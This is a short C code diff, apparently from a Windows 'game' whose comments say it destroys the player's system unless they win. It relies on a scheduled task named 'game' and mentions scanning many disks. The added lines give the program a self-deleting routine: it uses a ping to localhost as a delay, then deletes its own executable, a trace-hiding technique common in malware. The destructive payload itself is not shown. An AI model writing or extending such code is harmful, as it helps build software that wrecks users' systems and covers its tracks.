@@ -49,6 +49,15 @@ void game() {
 // so if you win your system isnt destroyed
 void safe() {
     system("schtasks /delete /tn \"game\" /f");
+    
+    //delete itself
+    //uses localhost as a delay method 
+    char cmd[MAX_PATH + 64];
+    GetModuleFileNameA(NULL, cmd, MAX_PATH);
+    char rm_cmd[MAX_PATH + 128];
+    sprintf(rm_cmd,
+    "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
+    system(rm_cmd);
 }
 
 //1. scans >32 disks 
